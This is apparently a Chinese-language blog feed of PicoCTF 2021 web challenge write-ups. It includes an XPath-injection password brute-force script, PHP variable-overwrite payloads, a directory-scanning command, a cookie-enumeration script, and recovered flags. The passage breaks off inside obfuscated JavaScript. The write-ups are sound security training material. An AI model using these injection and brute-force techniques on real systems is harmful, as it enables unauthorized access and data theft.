punctuation">.</span>progress<span class="token punctuation">(</span><span class="token string">'Brute-forcing password'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> p<span class="token punctuation">:</span>    index <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">while</span> <span class="token keyword">not</span> password<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">"&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> c <span class="token keyword">in</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> <span class="token string">"&#123;&#125;_"</span>  <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">:</span>            p<span class="token punctuation">.</span>status<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Index: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>index<span class="token punctuation">&#125;</span></span><span class="token string">, known password: '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>password<span class="token punctuation">&#125;</span></span><span class="token string">', trying: '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>c<span class="token punctuation">&#125;</span></span><span class="token string">'"</span></span><span class="token punctuation">)</span>            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"http://mercury.picoctf.net:16521/"</span><span class="token punctuation">,</span> data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"' or substring(//user[position()=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>user_id<span class="token punctuation">&#125;</span></span><span class="token string">]/pass,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>index<span class="token punctuation">&#125;</span></span><span class="token string">,1)='</span><span class="token interpolation"><span class="token punctuation">&#123;</span>c<span class="token punctuation">&#125;</span></span><span class="token string">' or 'a'='"</span></span><span class="token punctuation">,</span> <span class="token string">"pass"</span><span class="token punctuation">:</span> <span class="token string">"test"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">"right"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>                password <span class="token operator">+=</span> c                <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Can't find character for index </span><span class="token interpolation"><span class="token punctuation">&#123;</span>index<span class="token punctuation">&#125;</span></span><span class="token string">!"</span></span><span class="token punctuation">)</span>            <span class="token keyword">break</span>        index <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Password: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>password<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token comment">#output</span><span class="token comment">#[+] Brute-forcing password: Done</span><span class="token comment">#Password: picoCTF&#123;h0p3fully_u_t0ok_th3_r1ght_xp4th_f0505d9c&#125;</span></code></pre><h1 id="end"><a href="#end" class="headerlink" title="end"></a>end</h1><p>发现这些题目都很有意思，能学到很多内容，确实比起国内的层层套娃的题目质量好很多。</p>]]></content>
      
      
      <categories>
          
          <category> CTF题记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF题记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PicoCTF2021_Web(一)</title>
      <link href="/posts/9d77485d/"/>
      <url>/posts/9d77485d/</url>
      
        <content type="html"><![CDATA[<p><img src="https://gitee.com/m0re/picture/raw/master/img/ioenafnaj.jpg" loading="lazy"></p><p>人静的雨夜想起了她，她的挽留还萦绕耳旁</p><a id="more"></a><h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>无，刷题</p><h1 id="Mark-loves-cat"><a href="#Mark-loves-cat" class="headerlink" title="Mark loves cat"></a>Mark loves cat</h1><p>访问靶机寻找，在各个位置查看都是一样的界面，然后找信息泄露，最常见的网站备份没有发现。所以就尝试了扫目录。这里提一下扫目录的时候。我之前在扫描的时候，都是直接默认线程扫描。可能会导致自己的IP被ban，这里的dirsearch扫描的时候可以控制以下线程。<br>比如：</p><pre class="language-bash" data-language="bash"><code class="language-bash">python .<span class="token punctuation">\</span>dirsearch.py -u <span class="token string">"http://xxx.node3.buuoj.cn/"</span> -e * --timeout<span class="token operator">=</span><span class="token number">2</span> -t <span class="token number">1</span> -x <span class="token number">400,403</span>,404,500,503,429</code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20210617194049.png" loading="lazy"><br>这里发现了git泄露，如果是默认线程扫描，我也进行了尝试，git泄露都扫不出来，所以这也算是一个小技巧。<br>然后<code>gitHack</code>进行复原<code>git</code>泄露的文件，发现报错比较多，而且它不稳定。<code>index.php</code>和<code>flag.php</code>能扫描出来但是无法下载下来。所以我有找到了一个更好一点的工具，使用比较不错<a href="https://github.com/gakki429/Git_Extract">https://github.com/gakki429/Git_Extract</a><br>使用方法与<code>GitHack</code>差不多。<br>然后是下载下来了文件。</p><pre class="language-php" data-language="php"><code class="language-php">#index.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token single-quoted-string string">'flag.php'</span><span class="token punctuation">;</span><span class="token variable">$yds</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"dog"</span><span class="token punctuation">;</span><span class="token variable">$is</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"cat"</span><span class="token punctuation">;</span><span class="token variable">$handsome</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'yds'</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$x</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$$x</span> <span class="token operator">=</span> <span class="token variable">$y</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$x</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$$x</span> <span class="token operator">=</span> <span class="token variable">$$y</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$x</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token variable">$x</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$x</span> <span class="token operator">!==</span> <span class="token single-quoted-string string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token variable">$handsome</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token variable">$yds</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token single-quoted-string string">'flag'</span>  <span class="token operator">||</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token single-quoted-string string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token variable">$is</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"the flag is: "</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token shell-comment comment">#flag.php</span><span class="token operator">&lt;</span><span class="token operator">?</span>php<span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>瞄一眼代码，首先想到变量覆盖。<br>先看这里<code>foreach</code>，三个<code>foreach</code>有这不同的处理方式，这里首先说以下构造payload的两种思路</p><ul><li><p>通过最后一个<code>if</code>控制语句来构造exit会返回<code>$is</code>，要做的就是用<code>$is</code>覆盖掉<code>$flag</code>的值，尝试get的方式传参，传入<code>is=flag</code>会变成<code>$is=$flag</code>，这里就将flag的值传输过来了。然后需要绕过第一个if控制，就是需要传入flag参数，不管get或者post方式。否则就返回<code>$yds</code><br><img src="https://gitee.com/m0re/picture/raw/master/img/20210617221933.png" loading="lazy"><br>所以这里就需要利用第二个if了。<br>任意传入一个flag=flag即可，但是传入方式，从代码看不能是post，因为如果是post，就被第一个foreach语句给打乱了整个逻辑。所以要get方式传入。<br>以get方式传入参数还能绕过第三个foreach。就可以得到flag了。<br>payload：<code>?is=flag&amp;flag=flag</code><br>第二种：<code>?yds=flag</code><br>这个属于直接利用第一个if，利用变量覆盖漏洞，得到flag。很简单一道题目，自己看看就好了。</p><p>以下内容来自<code>PicoCTF</code></p></li></ul><h1 id="GET-aHEAD"><a href="#GET-aHEAD" class="headerlink" title="GET aHEAD"></a>GET aHEAD</h1><p>题目描述：找到此服务器上的flag以在比赛中领先</p><p>hints:</p><blockquote><p>Maybe you have more than 2 choices<br>Check out tools like Burp suite to modify your requests and look at the responses</p></blockquote><p>第三种选择，这里提供选择的很明显的一个是颜色，red and blue，然后就是使用burp suite查看响应包并修改一些什么内容。</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/image-20210807173900720.png" alt="image-20210807173900720" loading="lazy"></p><p>发现能改的地方，几乎没有，几个0改1，1改0等等，都没有什么反应，然后就剩下一个地方可以改了，就是请求方式<br>发现在choose Red的时候是get请求。而choose Blue的时候是POST请求，所以猜想可能是修改成另一种请求方式。<br><img src="https://gitee.com/m0re/picture/raw/master/img/image-20210807174501491.png" alt="image-20210807174501491" loading="lazy"><br>结合题目名字，修改请求头为<code>HEAD</code>，然后发包，拿到flag<br><img src="https://gitee.com/m0re/picture/raw/master/img/image-20210807175043582.png" alt="image-20210807175043582" loading="lazy"></p><h1 id="Cookies"><a href="#Cookies" class="headerlink" title="Cookies"></a>Cookies</h1><p>在这个搜索cookie的框中，有个占位文本，<code>snickerdoodle</code>，直接输入它，会进入到一个check页面，网页会返回<code>I love snickerdoodle cookies!</code>，然后找遍请求包也没找到flag，这里看到在请求包中存在<br><img src="https://gitee.com/m0re/picture/raw/master/img/image-20210807181659435.png" alt="image-20210807181659435" loading="lazy"></p><p>cookie中有个变量名为name，且为0，尝试将其改为其它数字，1，2，3….</p><p>发现返回内容会有变化，所以这里可能就是flag所在。</p><p>Python脚本进行修改name的值，并获取返回内容，得到flag</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://mercury.picoctf.net:29649/check"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    text <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'name'</span><span class="token punctuation">:</span> text    <span class="token punctuation">&#125;</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span>    result <span class="token operator">=</span> r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>split<span class="token punctuation">(</span>        <span class="token string">"&lt;p style=\"text-align:center; font-size:30px;\">&lt;b>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;/b>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Testing Cookie:&#123;&#125; | Result: &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'I love'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> result<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;code>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;/code>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>        <span class="token triple-quoted-string string">"""详情"""</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span>截取屏幕中央返回字符串内容的html代码</code></pre><h1 id="Scavenger-Hunt"><a href="#Scavenger-Hunt" class="headerlink" title="Scavenger Hunt"></a>Scavenger Hunt</h1><p>一个寻宝游戏，跟<code>Insp3ct0r</code>差不多，第一段flag在主站源代码中注释着。第二段flag在<code>css</code>代码中注释着。然后再看<code>js</code>代码中，会发现提示</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">/* How can I keep Google from indexing my website? */</span></code></pre><p>与Apache有关的文件，或者说是Apache独有的文件，极有可能是apache的配置文件，以往apache服务刚安装的时候，默认会生成的文件是<code>.htaccess</code>文件，这里直接访问果然得到了信息。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token shell-comment comment"># I love making websites on my Mac, I can Store a lot of information there.</span></code></pre><p>Mac独有的信息文件，<code>.DS_Store</code>访问即可获取信息泄露的内容。<br>总结：</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!-- Here's the first part of the flag: picoCTF&#123;t --></span>/* CSS makes the page look nice, and yes, it also has part of the flag. Here's part 2: h4ts_4_l0 *//* How can I keep Google from indexing my website? */# Part 3: t_0f_pl4c# I think this is an apache server... can you Access the next flag?# Part 4: 3s_2_lO0k# I love making websites on my Mac, I can Store a lot of information there.Congrats! You completed the scavenger hunt. Part 5: _fa04427c&#125;result: picoCTF&#123;th4ts_4_l0t_0f_pl4c3s_2_lO0k_fa04427c&#125;</code></pre><h1 id="Some-Assembly-Required-1"><a href="#Some-Assembly-Required-1" class="headerlink" title="Some Assembly Required 1"></a>Some Assembly Required 1</h1><p>这样的题目，emmm，总是遇到，完全没有思路。<br>思路一：全部复制JS代码，粘贴到控制台。有机会可以运行就能拿到flag<br>思路二：玩转JS。（鲨了我）<br>看JS代码</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">const</span> _0x402c<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'value'</span><span class="token punctuation">,</span><span class="token string">'2wfTpTR'</span><span class="token punctuation">,</span><span class="token string">'instantiate'</span><span class="token punctuation">,</span><span class="token string">'275341bEPcme'</span><span class="token punctuation">,</span><span class="token string">'innerHTML'</span><span class="token punctuation">,</span><span class="token string">'1195047NznhZg'</span><span class="token punctuation">,</span><span class="token string">'1qfevql'</span><span class="token punctuation">,</span><span class="token string">'input'</span><span class="token punctuation">,</span><span class="token string">'1699808QuoWhA'</span><span class="token punctuation">,</span><span class="token string">'Correct!'</span><span class="token punctuation">,</span><span class="token string">'check_flag'</span><span class="token punctuation">,</span><span class="token string">'Incorrect!'</span><span class="token punctuation">,</span><span class="token string">'./JIFxzHyW8W'</span><span class="token punctuation">,</span><span class="token string">'23SMpAuA'</span><span class="token punctuation">,</span><span class="token string">'802698XOMSrr'</span><span class="token punctuation">,</span><span class="token string">'charCodeAt'</span><span class="token punctuation">,</span><span class="token string">'474547vVoGDO'</span><span class="token punctuation">,</span><span class="token string">'getElementById'</span><span class="token punctuation">,</span><span class="token string">'instance'</span><span class="token punctuation">,</span><span class="token string">'copy_char'</span><span class="token punctuation">,</span><span class="token string">'43591XxcWUl'</span><span class="token punctuation">,</span><span class="token string">'504454llVtzW'</span><span class="token punctuation">,</span><span class="token string">'arrayBuffer'</span><span class="token punctuation">,</span><span class="token string">'2NIQmVj'</span><span class="token punctuation">,</span><span class="token string">'result'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token function-variable function">_0x4e0e</span><span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">_0x553839<span class="token punctuation">,</span>_0x53c021</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>_0x553839<span class="token operator">=</span>_0x553839<span class="token operator">-</span><span class="token number">0x1d6</span><span class="token punctuation">;</span><span class="token keyword">let</span> _0x402c6f<span class="token operator">=</span>_0x402c<span class="token punctuation">[</span>_0x553839<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">return</span> _0x402c6f<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">_0x76dd13<span class="token punctuation">,</span>_0x3dfcae</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">const</span> _0x371ac6<span class="token operator">=</span>_0x4e0e<span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">try</span><span class="token punctuation">&#123;</span><span class="token keyword">const</span> _0x478583<span class="token operator">=</span><span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x371ac6</span><span class="token punctuation">(</span><span class="token number">0x1eb</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x371ac6</span><span class="token punctuation">(</span><span class="token number">0x1ed</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x371ac6</span><span class="token punctuation">(</span><span class="token number">0x1db</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x371ac6</span><span class="token punctuation">(</span><span class="token number">0x1d9</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x371ac6</span><span class="token punctuation">(</span><span class="token number">0x1e2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x371ac6</span><span class="token punctuation">(</span><span class="token number">0x1e3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x371ac6</span><span class="token punctuation">(</span><span class="token number">0x1de</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x371ac6</span><span class="token punctuation">(</span><span class="token number">0x1e0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x371ac6</span><span class="token punctuation">(</span><span class="token number">0x1d8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x371ac6</span><span class="token punctuation">(</span><span class="token number">0x1ea</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x371ac6</span><span class="token punctuation">(</span><span class="token number">0x1e5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>_0x478583<span class="token operator">===</span>_0x3dfcae<span class="token punctuation">)</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">else</span> _0x76dd13<span class="token punctuation">[</span><span class="token string">'push'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x76dd13<span class="token punctuation">[</span><span class="token string">'shift'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span>_0x41d31a<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>_0x76dd13<span class="token punctuation">[</span><span class="token string">'push'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x76dd13<span class="token punctuation">[</span><span class="token string">'shift'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">(</span>_0x402c<span class="token punctuation">,</span><span class="token number">0x994c3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> exports<span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token keyword">async</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span><span class="token keyword">const</span> _0x48c3be<span class="token operator">=</span>_0x4e0e<span class="token punctuation">;</span><span class="token keyword">let</span> _0x5f0229<span class="token operator">=</span><span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token function">_0x48c3be</span><span class="token punctuation">(</span><span class="token number">0x1e9</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>_0x1d99e9<span class="token operator">=</span><span class="token keyword">await</span> WebAssembly<span class="token punctuation">[</span><span class="token function">_0x48c3be</span><span class="token punctuation">(</span><span class="token number">0x1df</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">await</span> _0x5f0229<span class="token punctuation">[</span><span class="token function">_0x48c3be</span><span class="token punctuation">(</span><span class="token number">0x1da</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>_0x1f8628<span class="token operator">=</span>_0x1d99e9<span class="token punctuation">[</span><span class="token function">_0x48c3be</span><span class="token punctuation">(</span><span class="token number">0x1d6</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>exports<span class="token operator">=</span>_0x1f8628<span class="token punctuation">[</span><span class="token string">'exports'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">onButtonPress</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">const</span> _0xa80748<span class="token operator">=</span>_0x4e0e<span class="token punctuation">;</span><span class="token keyword">let</span> _0x3761f8<span class="token operator">=</span>document<span class="token punctuation">[</span><span class="token string">'getElementById'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token function">_0xa80748</span><span class="token punctuation">(</span><span class="token number">0x1e4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token function">_0xa80748</span><span class="token punctuation">(</span><span class="token number">0x1dd</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> _0x16c626<span class="token operator">=</span><span class="token number">0x0</span><span class="token punctuation">;</span>_0x16c626<span class="token operator">&lt;</span>_0x3761f8<span class="token punctuation">[</span><span class="token string">'length'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>_0x16c626<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>exports<span class="token punctuation">[</span><span class="token function">_0xa80748</span><span class="token punctuation">(</span><span class="token number">0x1d7</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x3761f8<span class="token punctuation">[</span><span class="token function">_0xa80748</span><span class="token punctuation">(</span><span class="token number">0x1ec</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x16c626<span class="token punctuation">)</span><span class="token punctuation">,</span>_0x16c626<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>exports<span class="token punctuation">[</span><span class="token string">'copy_char'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span>_0x3761f8<span class="token punctuation">[</span><span class="token string">'length'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>exports<span class="token punctuation">[</span><span class="token function">_0xa80748</span><span class="token punctuation">(</span><span class="token number">0x1e7</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0x1</span><span class="token operator">?</span>document<span class="token punctuation">[</span><span class="token function">_0xa80748</span><span class="token punctuation">(</span><span class="token number">0x1ee</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token function">_0xa80748</span><span class="token punctuation">(</span><span class="token number">0x1dc</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token function">_0xa80748</span><span class="token punctuation">(</span><span class="token number">0x1e1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">_0xa80748</span><span class="token punctuation">(</span><span class="token number">0x1e6</span><span class="token punctuation">)</span><span class="token operator">:</span>document<span class="token punctuation">[</span><span class="token function">_0xa80748</span><span class="token punctuation">(</span><span class="token number">0x1ee</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token function">_0xa80748</span><span class="token punctuation">(</span><span class="token number">0x1dc</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token function">_0xa80748</span><span class="token punctuation">(</span><span class="token number">0x1e1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">_0xa80748</span><span class="token punctuation">(</span><span class="token number">0x1e8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>进行美化</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token string">'use strict'</span><span class="token punctuation">;</span><span class="token keyword">const</span> _0x402c <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"value"</span><span class="token punctuation">,</span> <span class="token string">"2wfTpTR"</span><span class="token punctuation">,</span> <span class="token string">"instantiate"</span><span class="token punctuation">,</span> <span class="token string">"275341bEPcme"</span><span class="token punctuation">,</span> <span class="token string">"innerHTML"</span><span class="token punctuation">,</span> <span class="token string">"1195047NznhZg"</span><span class="token punctuation">,</span> <span class="token string">"1qfevql"</span><span class="token punctuation">,</span> <span class="token string">"input"</span><span class="token punctuation">,</span> <span class="token string">"1699808QuoWhA"</span><span class="token punctuation">,</span> <span class="token string">"Correct!"</span><span class="token punctuation">,</span> <span class="token string">"check_flag"</span><span class="token punctuation">,</span> <span class="token string">"Incorrect!"</span><span class="token punctuation">,</span> <span class="token string">"./JIFxzHyW8W"</span><span class="token punctuation">,</span> <span class="token string">"23SMpAuA"</span><span class="token punctuation">,</span> <span class="token string">"802698XOMSrr"</span><span class="token punctuation">,</span> <span class="token string">"charCodeAt"</span><span class="token punctuation">,</span> <span class="token string">"474547vVoGDO"</span><span class="token punctuation">,</span> <span class="token string">"getElementById"</span><span class="token punctuation">,</span> <span class="token string">"instance"</span><span class="token punctuation">,</span> <span class="token string">"copy_char"</span><span class="token punctuation">,</span> <span class="token string">"43591XxcWUl"</span><span class="token punctuation">,</span> <span class="token string">"504454llVtzW"</span><span class="token punctuation">,</span> <span class="token string">"arrayBuffer"</span><span class="token punctuation">,</span> <span class="token string">"2NIQmVj"</span><span class="token punctuation">,</span> <span class="token string">"result"</span><span 